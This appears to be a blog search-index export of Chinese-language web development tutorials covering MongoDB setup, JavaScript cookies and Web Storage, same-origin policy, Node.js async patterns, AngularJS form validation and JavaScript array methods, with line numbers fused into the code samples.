      <url>%2F2017%2F02%2F02%2FMongodb(1)%E5%9F%BA%E7%A1%80%2F</url>
      <content type="text"><![CDATA[0x00 初步整个安装过程还是很简单的，Kali 是基于 Debian 的，所以将使用 Mongodb 的 Debian 社区版,详情参考官方文档-Mongodb社区安装。 这里主要记录，安装以后如何使用。 安装完成以后，打开 Mongodb 的配置文件 : 123456789101112131415161718192021222324252627282930313233343536373839404142vim /etc/mongod.conf# mongod.conf# for documentation of all options, see:# http://docs.mongodb.org/manual/reference/configuration-options/# Where and how to store data.storage: dbPath: /var/lib/mongodb journal: enabled: true# engine:# mmapv1:# wiredTiger:# where to write logging data.systemLog: destination: file logAppend: true path: /var/log/mongodb/mongod.log# network interfacesnet: port: 27017 bindIp: 127.0.0.1#processManagement:#security:#operationProfiling:#replication:#sharding:## Enterprise-Only Options:#auditLog:#snmp: 从配置文件我们可以指定，Mongodb 默认的数据库存放路径是 /var/lib/mongodb,其日志存放路径是 /var/log/mongodb/mongod.log，启用的端口是: 27017. 运行 Mongodb: 1$ service mongodb start 查看是否运行成功: 12$ netstat -pantu | grep &quot;27017&quot;tcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN 8171/mongod ok，没问题，完美运行! 停止运行: 1$ service mongod stop]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS离线应用与客户端存储]]></title>
      <url>%2F2017%2F02%2F02%2FJS%E7%A6%BB%E7%BA%BF%E5%BA%94%E7%94%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%82%A8%2F</url>
      <content type="text"><![CDATA[0x00 离线检测前端开发者一直希望 Web 应用能够与传统的客户端应用同场竞技，起码做到只要设备有电就能使用。支持离线 Web 应用开发成为 HTML5 的另一个重点。 开发离线应用的第一步是要知道设备是在线还是离线，HTML5 为此定义了一个 navigator.onLine 属性，该值为 true 时表示设备能上网，为 false 表示设备不能上网。 12345if (navigator.onLine) &#123; // 正常工作&#125; else &#123; // 执行离线状态时的任务&#125; 除此之外，为了更好的确认网络是否可用，HTML5 还定义了两个事件: online 和 offline。当网络从离线变为在线或者从在线变为离线时触发这两个事件。 这两个事件在 window 上触发: 1234567EventUtil.addHandler(window, &quot;online&quot;, function () &#123; console.log(&quot;Online&quot;);&#125;);EventUtil.addHander(window, &quot;offline&quot;, function () &#123; console.log(&quot;Offline&quot;);&#125;); ox01 应用缓存HTML5 的 应用缓存(application cache) 或者简称 appcache，是从浏览器的缓存中分离出来的一块缓存区。要想在这个缓存中保存数据，可以使用一个 描述文件(manifest file), 列出要下载和缓存的资源。 下面是一个简单的描述文件示例: 1234CACHE MANIFESTfile.jsfile.css 要将描述文件与页面关联起来，可以在 &lt;html&gt; 中的 manifest 属性中指定这个文件的路径: 1&lt;html manifest=&quot;/offline.manifest&quot;&gt;&lt;/html&gt; 该文件的扩展名必须是 .appcache 0x02 数据存储 CookieHTTP Cookie， 通常直接叫做 Cookie，最初是在客户端用于存储会话信息的。该标准要求服务器对任意的 HTTP 请求发送 Set-Cookie HTTP 头作为响应的一部分，其中包含会话信息: 123HTTP/1.1 200 OKContent-type: text/htmlSet-Cookie: name=value 名称(name)和值(value)在传送时都必需是 URL 编码的，浏览器会存储这样的会话信息，并在之后通过为每个请求添加 Cookie HTTP 头将信息发送回服务器: 12GET /index.html HTTP/1.1Cookie: name=value cookie 的构成 名称: 一个唯一确定 cookie 的名称。虽然 cookie 的名称是不区分大小写的，但是部分浏览器还是有大小写限制的。cookie 的名称必须经过 URL 编码。 值: 存储在 cookie 中的字符串值。值必需被 URL 编码。 域: cookie 对于哪个域是有效的。 路径: 对于指定域中的那个路径，应该向服务器发送 cookie。 失效时间: 表示 cookie 何时应该被删除的时间戳。 安全标志: 指定后，cookie 只有在使用 SSL 连接时才发送到服务器。 每段信息都作为 Set-Cookie 头的一部分，使用 分号 加 空格 分隔每一段: 123HTTP/1.1 200 OkContent-type: text/htmlSet-Cookie: name1=value1, name2=value2; expires=Mon, 22-Jan-08 GMT; domain=.wrox.com;path =/;secure; 如上，我们设置了一个对所有 wrox.ocm 的子域和域名下所有页面都有效的 cookie。同时指定了 secure 标志，这个 cookie 只能通过 SSL 连接才能传输。 0x03 在JavaScript 中使用 cookie在 JavaScript 中对 cookie 的操作主要是使用 document.cookie 属性，并且在使用的时候最好使用 encodeURIComponent() 和 decodeURIComponent() 来进行编码和解码。 原始的 JavaScript 操作 cookie 并不直观，所有我们有必要去封装一个更加直观和可复用的 CookieUtil 对象，以实现基本的读取，写入和删除操作。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455let CookieUtil = &#123; get: function (name) &#123; // 根据 cookie 名获取相应的值 let cookieName = encodeURIComponent(name) + &quot;=&quot;; // 将 cookie 加上 &quot;=&quot; let cookieStart = document.cookie.indexOf(cookieName); // 查找 cookie let cookieValue = null; if (cookieStart &gt; -1)&#123; let cookieEnd = document.cookie.indexOf(&quot;;&quot;, cookieStart); // 查找 cookieStart 之后的第一个分号(表示了该 cookie 的结束位置) // 如果没有找到，则表示该 cookie 是字符中的最后一个，则余下的字符串都是 cookie 的值 if (cookieEnd == -1)&#123; cookieEnd = document.cookie.length; &#125; cookieValue = decodeURIComponent(document.cookie.substring(cookieStart + cookieName.length, cookieEnd)); // 用 decodeURIComponent() 对 cookie 进行编码 &#125; return cookieValue; // 如果没有 cookie 则返回 null； &#125;, set: function(name, value, expires, path, domain, secure)&#123; // 设置 cookie，根据使用参数的频率排序，只有前两个是必须的 let cookieText = encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(value); if(expires instanceof Date)&#123; cookieText += &quot;; expires=&quot; + expires.toGMTString(); &#125; if (path)&#123; cookieText += &quot;; path=&quot; + path; &#125; if (domain)&#123; cookieText += &quot;; domain=&quot; + domain; &#125; if (secure)&#123; cookieText += &quot;; secure&quot;; &#125; document.cookie = cookieText; &#125;, unset: function(name, path, domain, secure)&#123; // 删除 cookie this.set(name, &quot;&quot;, new Date(0), path, domain, secure); &#125;&#125;;CookieUtil.set(&quot;book&quot;, &quot;Professional JavaScript&quot;, &quot;/books/projects/&quot;,&quot;www.wrox.com&quot;, new Date(), secure);// 设置 cookie ，包括它的路径，域和失效时间，以及仅能使用SSL 链接alert(CookieUtil.get(&quot;book&quot;))CookieUtil.unset(&quot;book&quot;, &quot;/books/projects&quot;, &quot;www.www.wrox.com&quot;)// 删除 cookie Chrome 不允许本地保存 cookie，需设置，推荐使用 FireFox 进行测试 关于 cookie 的思考首先 cookie 本身是不安全的，不应该在 cookie 中存储敏感信息，而且由于其受到浏览器的严格限制，注定其不能存储大容量的信息(5 kb)，即是我们可以通过子 cookie 的变种方案去打破单域名的 cookie 上限，但是 cookie 都会作为浏览器请求头发送，存储大量信息又势必会影响特定域的请求性能。 随着历史的推进渐渐的出现了一些新的存储机制。 0x04 WebStorageWebStorage 提供了一种在 cookie 之外存储会话数据的途径，是一种可跨会话存储大容量数(5M)的机制。 最初的 WebStorage 规范包括了 sessionStorage 和 globalStorage 两个对象，但最后 globalStorgae 被废弃，取而代之的是 localStorgae (但某些浏览器仍然只支持 globalStorage)。它们都是 Storage 类型，并作为 window 对象的属性存在。 Storage 类型提供如下方法: clear(): 删除所有值。(Firefox 没有实现) getItem(): 根据指定的名字 name 获取对应的值。 setItem(): 为指定的 name 设置一个对应的值。 removeItem(): 删除 name 指定的键值对儿。 key(index) 获得 index 位处的值的名字。 sessionStoragesessionStorage 对象存储特定于某个会话的数据，但也只会保存到浏览器关闭。此外，存储在 sessionStorage 中的数据只能由最初给对象存储数据的页面访问到，所以对多页面应用有限制。 我们可以使用 for-in 循环来迭代 sessionStorage 中的值: 1234for ( let key in sessionStorage)&#123; let value = sessionStorage.getItem(key); console.log(key + &quot;=&quot; value);&#125; 要删除 sessionStorage 推荐使用 removeItem() 方法，而不是使用 delete 操作符: 1sessionStorage.removeItem(&quot;book&quot;); localStorage localStorage 是可以持久保存客户端数据。要访问同一个 localStorage 对象，页面必须来自同一个域名(子域名无效)，使用同一种协议，在同一个端口上。 其使用方法和 sessionStorage 一样，但为了兼容只支持 globalStorage 的浏览器，可以使用以下函数: 123456789function getLocalStorage()&#123; if (typeof localStorage == &quot;object&quot;)&#123; return localStorage; &#125; else if (typeof globalStorage == &quot;object&quot;)&#123; return globalStorage[location.host]; &#125; else &#123; throw new Error(&quot;Local storage not avaliable); &#125;&#125; 0x05 使用 localStorage 缓存 js 和 css 代码 对于前端资源文件加载优化，一般就是 协商缓存(304)。即设置 Cahe-Control 里的 max-age，使页面资源请求返回 304，尽量延长资源的有效期，让浏览器直接使用本地缓存。 这一招(协商缓存(304))对 PC 端很好用，但是对于移动端，因为手机会经常清除本地缓存，所以文件缓存的时间也不会长。 这时 localStorage 就派上用场了。相对于 cookie 它可以存储大体积的数据，而且永久有效。如果把 JavaScript 和 CSS 资源存储在 localStorage 中，则可以省去 http 请求所消耗的时间。 使用 localStorage 面对的问题版本更新机制 普通的资源请求，可以根据 文件名 + md5 或者在资源链接后面加上特定的后缀做标识来判断是否需要更新资源。但如果使用 localStorage 则需要使用新的缓存更新机制。 更新代码的脚手架 我们还需要使用一个新的脚手架来管理资源文件的读取和写入。 资源配置信息 于此对应的是后端需要输出一份依据给前端做判断用，即资源配置信息，前端更据配置信息，进行匹配和比较，最终决定使用 localStorage 缓存还是重新发起请求。 XSS安全隐患 前端永远是不安全的。 最后推荐一个 MT 管理框架 0x06 更好的时代 Service Worker App Cache有些 局限性，例如它可以很容易地解决单页应用的问题，但是在多页应用上会很麻烦，而Service workers的出现正是为了解决App Cache的痛点。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[同源策略与CORS]]></title>
      <url>%2F2017%2F01%2F22%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECORS%2F</url>
      <content type="text"><![CDATA[0x00 同源策略同源策略(Same-origin policy) 是浏览器安全的基石,其目的是为了保护用户信息的安全，具体点，同源指的是三个相同，协议相同, 域名相同,端口相同。如果非同源，以下三种行为将会受到限制: Cookie,localStorage,和 IndexDNB 无法读取 DOM 无法获得 AJAX 请求不能发送 对于 Cookie 的限制，在以前，我们可以通过document.domain 来设置相同的域名以共享 Cookie。 也可以在服务器端指定 Cookie 所属的域名为一级域名: 1Set-cookie: key=value; domain=.onejustone.xyz; path= /; 这样二级和三级域名不用做任何设置，都可以读取这个 Cookie。 而如果两个网页不同源，则无法获取对方的 DOM，比如 iframe 窗口和 window.open 方法打开的窗口，它们与父窗口无法通信。这时如果两个窗口一级域名相同，而二级域名不同，则通过 document.domain 属性，即可规避同源策略，拿到 DOM。 而对于完全不同于源的网页则有三种方法: 片段是识别符(fragment identifier) window.name 跨文档通信API(Cross-document messaging) 片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如http://example.com/x.html#fragment的#fragment。如果只是改变片段标识符，页面不会重新刷新。 而通过 window.name 属性，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。但是使用window.name 将会非常影响页面性能。 好在 H5 引入了一个全新的 API，跨文档通信 API(Cross-document messaging),它为 window 对象新增了一个 window .postMessage 方法，运行跨窗口通信，无论这两个窗口是否同源。除此之外，连读取其它窗口的 localStorgae 也成为了可能。 0x01 CORS同源策略规定，AJAX 请求正发送给同源的网址，否则就会报错。面对这个问题，我们很多种解决的方法: JSONP Cmment]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[深入浅出Node.js(3)异步编程]]></title>
      <url>%2F2017%2F01%2F21%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode-js(3)%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%2F</url>
      <content type="text"><![CDATA[V8 和 异步 I/O 在性能上的提升，前后端 Javascript 编程风格的一致，是 Node 能够迅速成功并流行起来的原因。 0x00 优缺点Node 最大的优势莫过于基于事件驱动的非阻塞 I/O 模型，这是它的灵魂所在。非阻塞 I/O 可以使得 CPU 与 I/O 并不相互依赖等待，让资源得到更好的利用。 但也正是为了解决编程模型中阻塞 I/O 的性能问题，采用了单线程模型，这使得 Node 更像一个处理 I/O 密集问题的高手，而 CPU 密集型问题则取决于 Javascript 的单线程处理能力。 0x01 难点 异常处理Node 异步 I/O 的实现主要有两个阶段: 提交请求和处理结果。这两个阶段中间有事件循环的调度，两者彼此不关联。异步方法则通常在第一个阶段提交请求以后立即返回，但异常并不一定发生在这个阶段，try/catch 功效在此处不会发生任何作用。 123456789let async = function (callback)&#123; process.nextTick(callback);&#125;;try &#123; async(callback);&#125; catch (e) &#123; //TODO&#125;; Node 在处理异常上形成了一种约定: 将异常作为回调函数的第一个实参传回，如果为空值，则表明异步调用没有异常抛出 而在我们自行编写的异步方法上，也需要去遵循这样一些原则: 必需执行调用者传入的回调函数； 正确传递回异常供调用者判断。 示例如下: 123456789var async = function (callback)&#123; process.nextTick(function ()&#123; var results = something; if (error) &#123; return callback(error); &#125; callback(null, results); &#125;)&#125; 函数嵌套DOM 事件相对而言不会存在相互依赖或者多个事件一起协作的场景，较少存在异步多级依赖的情况，但在 Node 而言，事务中存在多个异步调用的场景比比皆是。 阻塞代码Javascript 中没有 sleep() 这样的线程沉睡功能，唯独能用于延时操作的只有 setInterval() 和 setTimeout() 这两个函数，而正常情况这两个函数并不能阻塞后续代码的执行，因为它们本身就是异步的。 多线程编程在浏览器中 javascript 执行线程与 UI 渲染共用同一个线程，为了使得 javascript 执行与 UI 渲染分离，浏览器端提出了 Web Works，它可以很好的利用多核 CPU 为大量计算服务。而对于 Node，在服务器端，若服务器是多核 CPU 单个 Node 进程实际上并没有充分利用到多核 CPU,Node 借鉴了 Web Works 的工作模式，将 child_process 作为其基础 API，而 cluster 模块则是更深层次的应用，基于此，开发人员可以在 javascript 中进行跨线程的编程了。 0x02 异步编程解决方案以下是异步编程的三种解决方案: 事件监听模式 Promise/Deferred 模式 流程控制库 事件监听模式事件监听模式是回调函数的事件化，一种广泛用于异步编程的模式，有称为 发布/订阅模式。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(4)表单]]></title>
      <url>%2F2017%2F01%2F21%2FAngularJS(4)%E8%A1%A8%E5%8D%95%2F</url>
      <content type="text"><![CDATA[0x00 双向数据绑定本章初始清单4-1%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-1.html) 我们除了在控制器显示的定义属性以外，还能通过双向数据绑定隐式的在数据模型中创建属性。而这对于需要使用表单元素收集用户输入数据从而在模型中创建新的属性或对象时非常有用。 123456$scope.addNewItem = function (newItem) &#123; $scope.todos.push(&#123; action: newItem.action + &quot;(&quot; + newItem.location + &quot;)&quot;, complete: false &#125;)&#125; 123&lt;input type=&quot;text&quot; ng-model=&quot;newTodo.action&quot; id=&quot;actionText&quot; class=&quot;form-control&quot;&gt;&lt;select name=&quot;&quot; ng-model=&quot;newTodo.location&quot; id=&quot;actionLocation&quot; class=&quot;form-control&quot;&gt;&lt;button class=&quot;btn btn-primary btn-block&quot; ng-click=&quot;addNewItem(newTodo)&quot;&gt;Add&lt;/button&gt; 如上，我们使用 mg-model 指令，用于更新未曾显示定义的模型属性值: newTodo.action 和 newTodo.location,然后通过为 button 添加 ng-click 事件调用 addNewItem() 传入用户通过表单输入的两个参数然后在控制器中将其推入代办事项数组中。 也可以直接访问 $scope.newTodo 对象进行操作，而不用采取参数传递的方式。 AngularJS 这种隐式定义使得处理数据变得简洁易用，但有一个普遍的问题是，我们很有可能会去访问一些没有定义的对象或属性，这时会导致错误异常，所以，有必要在访问之前对所使用的对象或属性进行检查: 12345678$scope.addNewItem = function (newItem) &#123; if (angular.isDefined(newItem) &amp;&amp; angular.isDefined(newItem.action) &amp;&amp; angular.isDefined(newItem)) &#123; $scope.todos.push(&#123; action: newItem.action + &quot;(&quot; + newItem.location + &quot;)&quot;, complete: false &#125;) &#125;&#125; 清单4-2%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-2.html) 0x01 表单校验AngularJS 对表单的支持主要是基于标准的 HTML 元素进行替换，当 AngularJS 遇到表单元素时指令会自动将 AngularJS 的特性和表单元素结合在一起，并且还提供了一些额外的功能用于增强开发体验。 为了获得 AngularJS 最佳的校验效果，必需为表单元素设置 name 属性,因为这样，就可以通过对应的 name 表单元素访问 AngularJS 所提供的给种特性变量,而通过这些变量可以检测当个元素或者整个表单的有效性: $pristine: 用户没有与元素/表单产生交互，返回 true; $dirty: 用户与元素/表单产生交互，返回 true; $valid: 当元素/表单内容的校验结果有效时返回 true; $invalid: 当元素/表单内容的校验结果无效时返回 true; $error: 提供校验错误的信息。 123&lt;form name=&quot;myForm&quot; novalidate ng-submit=&quot;addUser(newUser)&quot;&gt;&lt;button type=&quot;submit&quot; ng-disabled=&quot;myForm.$invalid&quot;&gt;Ok&lt;/button&gt;&lt;/form&gt; 如上，可以通过 name 属性访问 myForm 元素的 $invalid 变量以校验表单的有效性。 但，不止于此，AngularJS 还提供了一个类集合以结合 CSS 来对用户进行反馈以告知其输入的有效性。 以下是 AngularJS 校验中的四种类: ng-pristine: 未曾交互过的元素添加到该类； ng-dirty: 交互过的元素添加到该类； ng-valid: 校验结果有效的添加到该类； ng-invalid: 校验结果无效的添加到该类。 12345678form .ng-invalid.ng-dirty&#123; background-color:lightpink;&#125;/*交互过，无效类*/form .ng-valid.ng-dirty &#123; background-color: lightgreen;&#125;/*交互过，有效类*/span.summary.ng-invalid &#123; color: red; font-weight: bold;&#125;/*表单无效提醒*/span.summary.ng-valid &#123; color: green;&#125;/*表单有效提醒*/ 我们也可以对特定的校验约束提供反馈信息，即 AngularJS 也会将元素添加到类中以给出关于应用到的该元素的每一个校验约束的具体信息，而所使用的类名正是基于相应的元素的: 1234form .ng-invalid-required.ng-dirty &#123; background-color: lightpink;&#125;/* required 无效时样式*/form .ng-invalid-email.ng-dirty &#123; background-color: lightgoldenrodyellow;&#125;/* input email 元素无效时样式 */ 最后，使用特性变量结合 ng-show 指令给出反馈信息: 123456789101112131415&lt;style&gt; div.error&#123; color: red; font-weight: bold;&#125;&lt;/style&gt;&lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;&quot;&gt;Email:&lt;/label&gt; &lt;input type=&quot;email&quot; name=&quot;userEmail&quot; required ng-model=&quot;newUser.email&quot; class=&quot;form-control&quot;&gt; &lt;div class=&quot;error&quot; ng-show=&quot;myForm.userEmail.$invalid &amp;&amp; myForm.userEmail.$dirty&quot;&gt; &lt;span ng-show=&quot;myForm.userEmail.$error.email&quot;&gt; Please enter a valid email address. &lt;/span&gt; &lt;span ng-show=&quot;myForm.userEmail.$error.required&quot;&gt; Please enter a value. &lt;/span&gt; &lt;/div&gt;&lt;/div&gt; 清单4-3%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-3.html) 但若，表单中存在多个表单元素需要验证，这样写未免太过冗余，我们可以进一步，将返回的错误信息使用控制器来处理，修改如下: 1234567891011121314$scope.getError = function (error) &#123; if (angular.isDefined(error)) &#123; if (error.required)&#123; return &quot;Please enter a value&quot;; &#125; else if (error.email)&#123; return &quot;Please enter a valid email address&quot;; &#125; &#125;&#125;&lt;div class=&quot;error&quot; ng-show=&quot;myForm.userEmail.$invalid &amp;&amp; myForm.userEmail.$dirty&quot;&gt; &lt;!-- 注意此处是如何引用 input 元素以访问特性校验变量的--&gt; &#123;&#123;getError(myForm.userEmail.$error)&#125;&#125;&lt;/div&gt; 清单4-4%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-4.html) 0x02 使用表单指令属性AngularJS 使用的指令对 input 元素提供了额外的属性，以更好的实现对数据模型的集成。但这些属性仅适用于在 input 元素没有使用 type 属性或者 type 属性为 text,url,email,number 时适用。 1234567891011121314151617&lt;form name=&quot;myForm&quot; novalidate&gt;&lt;div class=&quot;well&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label&gt;Text:&lt;/label&gt; &lt;input name=&quot;sample&quot; class=&quot;form-control&quot; ng-model=&quot;inputValue&quot; ng-required=&quot;requireValue&quot; ng-minlength=&quot;3&quot; ng-maxlength=&quot;10&quot; ng-pattern=&quot;mathPattern&quot;&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;well&quot;&gt; &lt;p&gt;Required Error: &#123;&#123;myForm.sample.$error.required&#125;&#125;&lt;/p&gt; &lt;p&gt;Min Length Error: &#123;&#123;myForm.sample.$error.minlength&#125;&#125;&lt;/p&gt; &lt;p&gt;Max Length Error: &#123;&#123;myForm.sample.$error.maxlength&#125;&#125;&lt;/p&gt; &lt;p&gt;Pattern Error: &#123;&#123;myForm.sample.$error.pattern&#125;&#125;&lt;/p&gt; &lt;p&gt;Element Valid: &#123;&#123;myForm.sample.$valid&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;/form&gt; 适用于 input 元素的指令: ng-model: 双向数据绑定； ng-change: 用于指定一表达式，该表达式在元素内容被改变时被计算； ng-minlength: 设置元素所需的最小字符数； ng-maxlength: 设置元素所需的最大字符数； ng-pattern: 设置一个正则表达式； ng-required: 通过数据绑定设置 required 属性值。 清单4-5%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-5.html) 当 type 属性为 checkbox 时适用于 input 元素的属性: ng-model: 双向数据绑定； ng-chage: 指定一个表达式，当元素的内容发生改变时，计算表达式的值； ng-true-value: 被勾选时所绑定的表达式的值； ng-false-value: 取消勾选时所绑定的表达式的值。 清单4-6%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-6.html) 使用文本区清单4-7%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-7.html) 使用选择列表使用 ng-options 指令和使用 ng-repeat 指令是类似的，但会额外有一些专属于 selecte 元素的额外方法。 改变第一个选项元素AngularJS 会在 ng-model 指令所指定的变量值为 undefined 时生成一个值是问号并且没有任何内容的元素。 于是可以通过添加一个空值的 option 元素来替代默认的 option 元素。 清单4-8%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-8.html) 改变选项值有时并不希望使用整个元数据对象来设置 ng-model 的值，那么此时可以使用一个表达式来为 ng-options 属性指定对象中的一个属性。 清单4-9%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-9.html) 创建选项组元素ng-options 属性可以按照某个属性值将各个选项进行分组，为每个选项值生成一组 optgroup 元素。 清单1-10%E8%A1%A8%E5%8D%95/%E6%B8%85%E5%8D%954-10.html)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS引用类型(1)之Object]]></title>
      <url>%2F2017%2F01%2F21%2FJS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B(1)%E4%B9%8BObject%2F</url>
      <content type="text"><![CDATA[Object其实很多类型都是 Object 类型的实例，虽然 Object 类型的实例不具备多少功能，但是对于应用程序中存储和传输数据而言，确是非常理想的选择。 有两种方法创建 Object 实例:一个是使用 new Object，即是调用 Object 的构造函数。而另一种方式是使用对象字面量。 如果使用字面量的方法，则不会调用 Object 的构造函数。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS引用类型(2)之Array]]></title>
      <url>%2F2017%2F01%2F21%2FJS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B(2)%E4%B9%8BArray%2F</url>
      <content type="text"><![CDATA[0x00 Array objectJS 数组的每一项可以保存任何类型的数据，并且 JS 的数组大小是可以动态调整的，即可以随着数据的添加自动增长以容纳新的数据。 JavaScript 中没有明确的数组数据类型。但是，我们可以通过使用内置 Array 对象和它的方法对数组进行操作。 creating an array使用 Array 构造函数创建数组12var arr = new Array(a, b, c,...N);var arr = Array(a, b, c,..N); 使用数组字面量创建数组1var arr = [a, b, c, ..N]; var arr = [4] 和 var arr = new Array(4) 是不等效的，后者指的是数组长度。 创建指定长度的空数组123456var arr = new Array(arraylength);var arr = Array(arraylength);//以下等效var arr = [];arr.length = arrrayLength; 0x01 数组与对象数组可以作为一个属性(property)分配给一个新的或者已经存在的对象(object). 12345var obj = &#123;&#125;;obj.prop = [element0, element1, ..., elementN];//orvar obj = &#123; prop:[element0, element1, ..., elementN]&#125;; 0x02 填充数组 (populating an array)给元素赋值以填充数组123var emp = [];emp[0] = &quot;haha&quot;;emp[1] = &quot;heihei&quot;; 创建数组时填充1234var myArray = new Array(&quot;hello&quot;, myVar, 3.1244);//orvar myArray = [&quot;mna&quot;, &quot;apple&quot;, &quot;orange&quot;]; 0x03 数组的 length 属性有趣的是， length 属性不是只读的，可以通过 lenght 属性从数组的末尾移除或添加元素。 指定 length 长度以删除最后一个元素 12var colors = [&quot;red&quot;, &quot;blure&quot;, &quot;green&quot;];colors.length = 2; 使用 length 向末尾添加元素 1colors[colors.length] = &quot;black&quot;; 0x04 检测数组可以使用 instanceof 操作符来检测数组 123if (value instanceof Array)&#123; do something;&#125; 但是当网页包含多个框架是使用 instanceof 就可能存在问题。所以使用 Array.isArray() 也许更好。 12345678910111213141516if ( Array.isArray(value)) &#123; do something;&#125;``` ---### 0x05 数组方法 array methods---#### toString(),valueOf(),toLocalString()当然，所有对象都具有 `toString()`,`valueOf()`,`toLocalString()` 这三种方法。调用数据的 `toString()` 会返回一个由数组元素拼接而成的用逗号隔开的字符串: var colors = [“red”, “blue”, “green”];console.log(colors.toString())// 字符串: red,blue,green1234567而调用数组的 `valueOf()` 方法返回的还是数组。---#### join() join() 方法只接受一个参数，就是用作分隔符的字符串，然后返回所有数组项的字符串。 var colors = [“red”, “green”, “white”];colors.join(“||”); // red||green||white123456---#### 重排序 sort(), reverse()`sort()` 方法会调用每个数组项的 `toString()` 方法，再按数组项的 ASCAII 码进行排序，并且会改变原来数组的顺序。所以 `sort()` 方法并不适合对全数字的数组进行排序。##### 使用 sort() 方法对数组元素进行随机排列 var arr = [“红”,”橙”,”黄”,”绿”,”黑”]arr.sort(function(a,b){ var num = Math.random()-0.5 return num;})12345678`reverse()` 方法可以反转数组项的顺序,同样的 `reverse()` 函数也会改变原始数组的顺序。---#### unshift(), shift()`shift()` 能够移除数组的第一项并返回该项，同时将数组的长度减 1。 var colors = new Array();var count = colors.push(“red”, “green”);alet(count); //2 colors.push(“black”); var item = colors.shift(); // red;12345678`unshift()` 作用与 `shift()` 相反，它在数组前端添加 n 个任一项并返回新的数组长度。---#### 栈的方法 push(), pop()栈是一种 LIFO( Last In First Out 后进先出)的数据结构，也就是最新添加的项最后被移除，而栈中项的插入叫 **推入** 和 删除叫 **弹出**。JS 提供了 push() 和 pop() 方法，以类似栈的行为。 push() 方法可以接受任意数量的参数，把它们逐个添加到数组末尾，并返回修改以后的数组长度。 var colors = [“red”, “blue”, “green”];console.log(colors.push(‘balck’));// 412pop() 方法则是从数组末尾移除一项，减少 length 的值，然后返回移除的项。 var colors = [“red”, “blue”, “green”];console.log(colors.push(‘balck’));// 4console.log(colors.pop());// black12345678910111213141516---#### 队列的方法 栈数据结构的访问规则是 LIFO(后进先出的)，而队列的访问规则是 FIFO(First In First Out)，先进先出的。由于 `push()` 是向数组末端添加项的方法。那么，结合 `push()` 和 `shitft()` 便可以像使用队列那样使用数组了。`unshift()` 结合 `pop()` 可以从相反的方向来模拟队列。---#### concat() `contact()` 方法会先创建一个当前数组的一副本，然后将接收到的参数添加到这个副本的末尾，最后返回新构建的数组。`concat()` 方法不会影响到原始数组。---#### slice()slice() 方法同样会先创建一个当前数组的副本，然后在只有一个参数的情况下返回从该参数指定位置到当前数组末端的所有的项；在有两个参数的情况下，则返回从该参数开始的位置到结束位置之间的项---但是不包括结束位置。 arr = [1,3,4,56]arr2 = arr.slice(0);1234`slice()` 方法不会影响到原始数组。在函数式编程的术语中，我们说它是一个 **纯函数**。 var colors = [“red”, “blue”, “green”, “balck”];console.log(colors.slice(1));// [“blue”, “green”, “balck”]console.log(colors);// [“red”, “blue”, “green”, “balck”]console.log(colors.slice(1));// [“blue”, “green”, “balck”]console.log(colors);// [“red”, “blue”, “green”, “balck”]1234567---#### splice() `splice()` 要用途主要是在数组的中部插入项。它有以下3种用法:删除: 可以删除任意数量的项，并且只需要两个参数，要删除的第一项的位置和要删除的项数。 splice(2); //从下标为 2 的位置开始删除以后的所有12 splice(0, 2); //将会删除数组中的前两项12插入: 可向指定位置插入任意数量的项，只需三个参数: 起始位置，0（要删除的数），要插入的项。 splice(2,0,”red”,”green”,”white”); //从下标为 2 的位置开始插入12替换: 只需指定三个数： 起始位置，要删掉的项数，要插入的任意数量的项。 splice(2,1,”red”,”green”);123456`splice()` 方法始终都会返回一数组，该数组包含从原始数组中删除的项（没有删除的项则会返回一个空数组）。但是 `splice()` 方法会影响到原始数组。在函数式编程的术语中，我们说它是一个 **非纯函数**。 var colors = [“red”, “blue”, “green”, “balck”];console.log(colors.splice(0, 1));// [“red”]console.log(colors);// [“blue”, “green”, “balck”]console.log(colors.splice(0, 1));// [“blue”]console.log(colors);// [“green”, “balck”]console.log(colors.splice(0, 1));// [“green”]console.log(colors);// [“balck”]123456---#### indexOf(), lastIndexOf()`indexOf()` 和 `lastIndexOf()` 都返回要查找的项在数组中的位置。它们都接收两参数:要查找的项 和表示查找起点位置的索引。其中 `indexOf()`从数组的的开头开始向后找，`lastIndexOf()`从数组的末尾开始向前找。 var colors = new Array(“red”,”green”,”black”,”dfjsl”);alert(colors.indexOf(“black”)); // 2alert(colors.indexOf(“dfjsl”,2)); //312345---### 0x06 迭代方法##### for 循环遍历数组 for (var i = 0;i &lt; arr.lenght; i++) { statement}12##### forEach() 方法遍历数组 var colors = [‘red’, ‘green’, ‘blue’]; colors.forEach(function (color){ document.write(color); });1234567891011forEach() 函数将数组元素作为参数依次迭代传递给 function.&gt; 一旦 JS 元素被保存为标准的对象属性，再使用 `for..in` 循环来迭代将变得非常不适用，因为正常元素和所有可枚举的属性都会被列出。当然，ES6 